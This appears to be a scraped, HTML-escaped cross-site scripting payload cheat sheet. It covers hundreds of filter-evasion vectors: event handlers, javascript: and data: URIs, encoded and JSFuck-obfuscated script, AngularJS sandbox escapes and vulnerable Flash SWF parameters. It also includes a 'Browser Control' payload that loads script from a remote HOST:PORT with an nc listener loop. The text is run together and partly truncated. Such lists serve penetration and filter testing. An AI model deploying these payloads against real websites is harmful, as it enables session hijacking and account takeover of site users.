URL=http://;URL=javascript:alert('XSS');"&gt;&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"&gt;&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt; exp/*&lt;A STYLE='no\xss:noxss("*//*"); xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'&gt;&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;&lt;STYLE&gt;.XSS&#123;background-image:url("javascript:alert('XSS')");&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;&lt;STYLE type="text/css"&gt;BODY&#123;background:url("javascript:alert('XSS')")&#125;&lt;/STYLE&gt;&lt;!--[if gte IE 4]&gt; &lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt; &lt;![endif]--&gt;&lt;BASE HREF="javascript:alert('XSS');//"&gt;&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://test.com/scriptlet.html"&gt;&lt;/OBJECT&gt;&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert('XSS')&gt;&lt;/OBJECT&gt;&lt;EMBED SRC="http://test.com/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;&lt;EMBED SRC="data:image/svg+xml;base64,JTIwPiI8PGlmcmFtZSBzcmM9aHR0cDovL3Z1bG4tbGFiLmNvbSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSA8" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;Flash SWF XSS ZeroClipboard: ZeroClipboard.swf?id=\"))&#125;catch(e)&#123;confirm(/XSS./.source);&#125;//&amp;width=500&amp;height=500&amp;.swf plUpload Player: plupload.flash.swf?%#target%g=alert&amp;uid%g=XSS&amp; plUpload MoxiePlayer: Moxie.swf?target%g=confirm&amp;uid%g=XSS (also works with Moxie.cdn.swf and other variants) FlashMediaElement: flashmediaelement.swf?jsinitfunctio%gn=alert1 videoJS: video-js.swf?readyFunction=confirm and video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29 YUI "io.swf": io.swf?yid=\"));&#125;catch(e)&#123;alert(document.domain);&#125;// YUI "uploader.swf": uploader.swf?allowedDomain=\%22&#125;%29%29%29&#125;catch%28e%29&#123;alert%28document.domain%29;&#125;//&lt; Open Flash Chart: open-flash-chart.swf?get-data=(function()&#123;alert(1)&#125;)() AutoDemo: control.swf?onend=javascript:alert(1)// Adobe FLV Progressive: /main.swf?baseurl=asfunction:getURL,javascript:alert(1)// and /FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)// Banner.swf (generic): banner.swf?clickTAG=javascript:alert(document.domain);// JWPlayer (legacy): player.swf?playerready=alert(document.domain) and /player.swf?tracecall=alert(document.domain) SWFUpload 2.2.0.1: swfupload.swf?movieName="]);&#125;catch(e)&#123;&#125;if(!self.a)self.a=!confirm(1);// Uploadify (legacy): uploadify.swf?movieName=%22])&#125;catch(e)&#123;if(!window.x)&#123;window.x=1;confirm(%27XSS%27)&#125;&#125;//&amp;.swf FlowPlayer 3.2.7: flowplayer-3.2.7.swf?config=&#123;"clip":&#123;"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"&#125;&#125;&amp;.swfa="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);XML Schema&lt;HTML xmlns:xss&gt; &lt;?import namespace="xss" implementation="http://vuln-lab.com/xss.htc"&gt; &lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&gt;&lt;![CDATA[cript:alert('XSS');"&gt;]]&gt;&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;&lt;?xml version="1.0" ?&gt;&lt;someElement&gt;&lt;a xmlns:a='http://www.w3.org/1999/xhtml'&gt;&lt;a:body onload='alert(1)'/&gt;&lt;/a&gt;&lt;/someElement&gt;&lt;SCRIPT SRC="http://test.com/xss.jpg"&gt;&lt;/SCRIPT&gt;&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://test.com/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;&lt;? echo('&lt;SCR)';echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;&lt;IMG SRC="http://www.test.com/file.php?variables=malicious"&gt;Redirect 302 /test.jpg http://test.com/admin.asp&amp;deleteuser&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"&gt;&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-&lt;SCRIPT a="&gt;" SRC="http://test.com/xss.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=`&gt;` SRC="http://test.com/xss.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://test.com/xss.js"&gt;&lt;/SCRIPT&gt;&lt;A HREF="http://server.com/"&gt;XSS&lt;/A&gt;&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;&lt;A HREF="javascript:document.location='http://www.test.com/'"&gt;XSS&lt;/A&gt;%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%74%65%73%74%2E%64%65%3E&amp;#x3C;&amp;#x69;&amp;#x66;&amp;#x72;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x20;&amp;#x73;&amp;#x72;&amp;#x63;&amp;#x3D;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x2E;&amp;#x64;&amp;#x65;&amp;#x3E;&amp;#60&amp;#105&amp;#102&amp;#114&amp;#97&amp;#109&amp;#101&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#116&amp;#101&amp;#115&amp;#116&amp;#46&amp;#100&amp;#101&amp;#62PGlmcmFtZSBzcmM9aHR0cDovL3Rlc3QuZGU+&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"&lt;sVg&gt;&lt;scRipt &gt;alert&amp;lpar;1&amp;rpar; &#123;Opera&#125;&lt;img/src=`` onerror=this.onerror=confirm(1) &lt;form&gt;&lt;isindex formaction="javascript&amp;colon;confirm(1)"&lt;img src=``&amp;NewLine; onerror=alert(1)&amp;NewLine;&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;&lt;iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)&gt;&lt;img src='1' onerror\x00=alert(0) /&gt;&lt;img src='1' onerror/=alert(0) /&gt;&lt;img src='1' onerror\x0b=alert(0) /&gt;&lt;img src='1' onerror=\x00alert(0) /&gt;&lt;img src='1' o\x00nerr\x00or=alert(0) /&gt;&lt;\x00img src='1' onerror=alert(0) /&gt;&lt;script\x00&gt;alert(1)&lt;/script&gt;&lt;i\x00mg src='1' onerror=alert(0) /&gt;&lt;img/src='1'/onerror=alert(0)&gt;&lt;img\x0bsrc='1'\x0bonerror=alert(0)&gt;&lt;img src='1''onerror='alert(0)'&gt;&lt;img src='1'"onerror="alert(0)"&gt;&lt;img src='1'\x00onerror=alert(0)&gt;&lt;img src='1'onerror=alert(0)&gt;“&gt;&lt;img title="test-xss" onmouseup="confirm(document.domain)"&gt;Firefox (\x09, \x0a, \x0d, \x20)Chrome (Any character \x01 to \x20)&lt;iframe src="\x01javascript:alert(0)"&gt;&lt;/iframe&gt; &lt;!-- Example for Chrome --&gt;&lt;img src='1' onerror='alert(0)' &lt;Extra less-than characters (IE, Firefox, Chrome, Safari).&lt;&lt;script&gt;alert(0)&lt;/script&gt;&lt;style&gt;body&#123;background-color:expression\(alert(1))&#125;&lt;/style&gt;&lt;script&gt;document.write('&lt;a hr\ef=j\avas\cript\:a\lert(2)&gt;blah&lt;/a&gt;');&lt;/script&gt;&lt;img src="1" onerror="alert(1)" /&gt;&lt;img src="1" onerror="&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;" /&gt;&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;&lt;iframe src="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;"&gt;&lt;/iframe&gt;&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;&lt;iframe src="javascript:%61%6c%65%72%74%28%31%29"&gt;&lt;/iframe&gt;&lt;div style="x:expression(alert(1))"&gt;Joker&lt;/div&gt;&lt;div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))"&gt;Joker&lt;/div&gt;&lt;div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))"&gt;Joker&lt;/div&gt;&lt;div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029"&gt;Joker&lt;/div&gt;&lt;script&gt;document.write('&lt;img src=1 onerror=alert(1)&gt;');&lt;/script&gt;&lt;script&gt;document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');&lt;/script&gt;&lt;script&gt;document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');&lt;/script&gt;&lt;script&gt;document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');&lt;/script&gt;&lt;script&gt;document.write('&lt;img src=1 onerror=alert(1)&gt;');&lt;/script&gt;&lt;script&gt;document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;/script&gt;&lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC&gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2&lt;img src="1" onnerror="alert(1)"&gt;%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE&lt;img src="1" onerror="alert(1)" /&gt;+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-&lt;script&gt;alert(1)&lt;/script&gt;%uff1cscript%uff1ealert(1)%uff1c/script%uff1e&lt;img src="1" onerror="alert('1')"&gt;%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A&lt;video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" /&gt;&lt;video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" /&gt;&lt;blah style="blah:expression(alert(1))" /&gt;&lt;div style="z:exp/*anything*/res/*here*/sion(alert(1))" /&gt;&lt;script&gt;window['alert'](0)&lt;/script&gt;&lt;script&gt;parent['alert'](1)&lt;/script&gt;&lt;script&gt;self['alert'](2)&lt;/script&gt;&lt;script&gt;top['alert'](3)&lt;/script&gt;&lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)&gt;&lt;script&gt;var junk = '&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;';&lt;/script&gt;&lt;style&gt;body &#123; background-image:url('http://www.test.com/&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;'); &#125;&lt;/style&gt;&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;&lt;iframe src="vbscript:msgbox(1)"&gt;&lt;/iframe&gt; (IE)&lt;iframe src="data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;"&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari)&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari)http://test.com/something.xxx?a=val1&amp;a=val2ASP.NET a = val1,val2ASP a = val1,val2JSP a = val1PHP a = val2&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;&lt;script&gt;eval(location.hash)&lt;/script&gt; (Firefox)http://test.com/something.jsp?inject=&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#alert(1)&lt;iframe src="http://test.com/something.jsp?inject=&lt;script&gt;eval(name)&lt;/script&gt;" name="alert(1)"&gt;&lt;/iframe&gt;&lt;script&gt;$=~[];$=&#123;___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:(&#123;&#125;+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();&lt;/script&gt;&lt;script&gt;(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[] "&gt;&lt;"&lt;img src="x"&gt;%20%20&gt;"&lt;iframe src=evil.source&gt;%20&lt;iframe&gt;"&gt;&lt;iframe src=a onload=alert("PENTEST") &lt;" src="&gt;&lt;svg/onload=prompt(2)&gt; ""input onfocus=alert(2)" autofocus&gt;" onfocus="alert(1)" autofocust" onmouseover=alert(/xss/); a="%22onmouseover%3d%22alert(document.domain)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22uo545"&gt;&lt;img src=x onerror=alert(/PTEST/)&lt;/script&gt; "&gt;&lt;img src=x onerror=prompt(23);&gt;&lt;h&gt;xxs link&lt;a&gt;&lt;img src="c" onerror=alert(1)&gt;&lt;img src=x onerror=alert('h')&gt;&lt;xmp&gt;&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;&lt;a onmouseover=alert(document.cookie)&gt;%20&lt;h&gt;xxs link&lt;a&gt;&lt;iframe src="c" onload=alert(1)&gt;&lt;div onactivate=alert('XSSTEST') id=xss style=overflow:scroll&gt;Ij48IjxpbWcgc3JjPSJ4Ij4lMjAlMjA+IjxpZnJhbWUgc3JjPWE+JTIwPGlmcmFtZT4=String Char Eval &#123;&#123;'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");&#125;&#125; 'a'.constructor.prototype['char\u0041t'] 'a'.constructor.prototype['char\u0041t']=''.concat;&#123;&#123;'a'.constructor.prototype['char\u0041t']=''.concat;$eval("x='\"+(y='if(!window\\u002?x)alert(window\\u002ex=1)')+eval(y)+\"'");&#125;&#125; &#123;&#123; (&#123;&#125;.toString()).constructor.prototype.charAt=[].join; $eval((&#123;&#125;.toString()).constructor.fromCharCode(120,61,49,125,32,125,32,125,59,97,108,101,114,116,40,49,41,47,47))&#125;&#125;&#123;&#123; x=toString();x.constructor.prototype.charAt=x.constructor.prototype.concat; $eval(x.constructor.fromCharCode(120,61,49,125,32,125,32,125,59,97,108,101,114,116,40,49,41,47,47))&#125;&#125;t=o.anchor(true);//&lt;a name="true"&gt;[object Undefined]&lt;/a&gt;&#123;&#123;c=[];o=toString();t=o.anchor(true);f=o.anchor(false);c.push(o[5]);c.push(o[1]);c.push(t[3]);c.push(f[12]);c.push(t[9]);c.push(t[10]);c.push(t[11]);c.push(o[5]);c.push(t[9]);c.push(o[1]);c.push(t[10]);a=c.join([]);b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[c.join([])].fromCharCode(97,108,101,114,116,40,49,41))()&#125;&#125;HTML ContextTag Injection &lt;svg onload=alert(1)&gt;“&gt;&lt;svg onload=alert(1)//HTML ContextInline Injection “onmouseover=alert(1)//“autofocus/onfocus=alert(1)//Javascript ContextCode Injection ‘-alert(1)-‘‘-alert(1)//Javascript ContextCode Injection(escaping the escape) \’-alert(1)//Javascript ContextTag Injection &lt;/script&gt;&lt;svg onload=alert(1)&gt;PHP_SELF Injection http://DOMAIN/PAGE.php/”&gt;&lt;svg onload=alert(1)&gt;Without Parenthesis &lt;svg onload=alert`1`&gt;&lt;svg onload=alert&amp;lpar;1&amp;rpar;&gt;&lt;svg onload=alert&amp;#x28;1&amp;#x29&gt;&lt;svg onload=alert&amp;#40;1&amp;#41&gt;Filter BypassAlert Obfuscation (alert)(1)a=alert,a(1)[1].find(alert)top[“al”+”ert”](1)top[/al/.source+/ert/.source](1)al\u0065rt(1)top[‘al\145rt’](1)top[‘al\x65rt’](1)top[8680439..toString(30)](1)Body Tag &lt;body onload=alert(1)&gt;&lt;body onpageshow=alert(1)&gt;&lt;body onfocus=alert(1)&gt;&lt;body onhashchange=alert(1)&gt;&lt;a href=#x&gt;click this!#x&lt;body style=overflow:auto;height:1000px onscroll=alert(1) id=x&gt;#x&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;x id=x&gt;#x&lt;body onresize=alert(1)&gt;press F12!&lt;body onhelp=alert(1)&gt;press F1! (MSIE)Miscellaneous Vectors &lt;marquee onstart=alert(1)&gt;&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;&lt;audio src onloadstart=alert(1)&gt;&lt;video onloadstart=alert(1)&gt;&lt;source&gt;&lt;input autofocus onblur=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;&lt;select onchange=alert(1)&gt;&lt;option&gt;1&lt;option&gt;2&lt;menu id=x contextmenu=x onshow=alert(1)&gt;right click me!Agnostic Event Handlers &lt;x contenteditable onblur=alert(1)&gt;lose focus!&lt;x onclick=alert(1)&gt;click this!&lt;x oncopy=alert(1)&gt;copy this!&lt;x oncontextmenu=alert(1)&gt;right click this!&lt;x oncut=alert(1)&gt;copy this!&lt;x ondblclick=alert(1)&gt;double click this!&lt;x ondrag=alert(1)&gt;drag this!&lt;x contenteditable onfocus=alert(1)&gt;focus this!&lt;x contenteditable oninput=alert(1)&gt;input here!&lt;x contenteditable onkeydown=alert(1)&gt;press any key!&lt;x contenteditable onkeypress=alert(1)&gt;press any key!&lt;x contenteditable onkeyup=alert(1)&gt;press any key!&lt;x onmousedown=alert(1)&gt;click this!&lt;x onmousemove=alert(1)&gt;hover this!&lt;x onmouseout=alert(1)&gt;hover this!&lt;x onmouseover=alert(1)&gt;hover this!&lt;x onmouseup=alert(1)&gt;click this!&lt;x contenteditable onpaste=alert(1)&gt;paste here!Code ReuseInline Script &lt;script&gt;alert(1)//&lt;script&gt;alert(1)&lt;!–Code ReuseRegular Script &lt;script src=//localhost:8080/1.js&gt;&lt;script src=//3334957647/1&gt;Filter BypassGeneric Tag + Handler Encoding Mixed Case Spacers%3Cx onxxx=1&lt;%78 onxxx=1&lt;x %6Fnxxx=1&lt;x o%6Exxx=1&lt;x on%78xx=1&lt;x onxxx%3D1 &lt;X onxxx=1&lt;x OnXxx=1&lt;X OnXxx=1Doubling&lt;x onxxx=1 onxxx=1 &lt;x/onxxx=1&lt;x%09onxxx=1&lt;x%0Aonxxx=1&lt;x%0Conxxx=1&lt;x%0Donxxx=1&lt;x%2Fonxxx=1Quotes Stripping Mimetism&lt;x 1=’1’onxxx=1&lt;x 1=”1?onxxx=1 &lt;[S]x onx[S]xx=1[S] = stripped char or string&lt;x &lt;/onxxx=1&lt;x 1=”&gt;” onxxx=1&lt;http://onxxx%3D1/Generic Source Breaking &lt;x onxxx=alert(1) 1=’Browser Control &lt;svg onload=setInterval(function()&#123;with(document)body.appendChild(createElement(‘script’)).src=’//HOST:PORT’&#125;,0)&gt;$ while :; do printf “j$ “; read c; echo $c | nc -lp PORT &gt;/dev/null; doneMulti Reflection Double ReflectionSingle Input Single Input (script-based)‘onload=alert(1)&gt;&lt;svg/1=’ ‘&gt;alert(1)&lt;/script&gt;&lt;script/1=’*/alert(1)&lt;/script&gt;&lt;script&gt;/*Triple ReflectionSingle Input Single Input (script-based)*/alert(1)”&gt;’onload=”/*&lt;svg/1=’`-alert(1)”&gt;’onload=”`&lt;svg/1=’ */&lt;/script&gt;’&gt;alert(1)/*&lt;script/1=’Multi Input Double Input Triple Inputp=&lt;svg/1=’&amp;q=’onload=alert(1)&gt; p=&lt;svg 1=’&amp;q=’onload=’/*&amp;r=*/alert(1)’&gt;Without Event Handlers &lt;script&gt;alert(1)&lt;/script&gt;&lt;script src=javascript:alert(1)&gt;&lt;iframe src=javascript:alert(1)&gt;&lt;embed src=javascript:alert(1)&gt;&lt;a href=javascript:alert(1)&gt;click&lt;math&gt;&lt;brute href=javascript:alert(1)&gt;click&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;&lt;isindex action=javascript:alert(1) type=submit value=click&gt;&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;click&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=click&gt;&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=click&gt;&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=SOURCE&gt;&lt;isindex formaction=javascript:alert(1) type=submit value=click&gt;&lt;object data=javascript:alert(1)&gt;&lt;iframe srcdoc=&lt;svg/o&amp;#x6Eload&amp;equals;alert&amp;lpar;1)&amp;gt;&gt;&lt;svg&gt;&lt;script xlink:href=data:,alert(1) 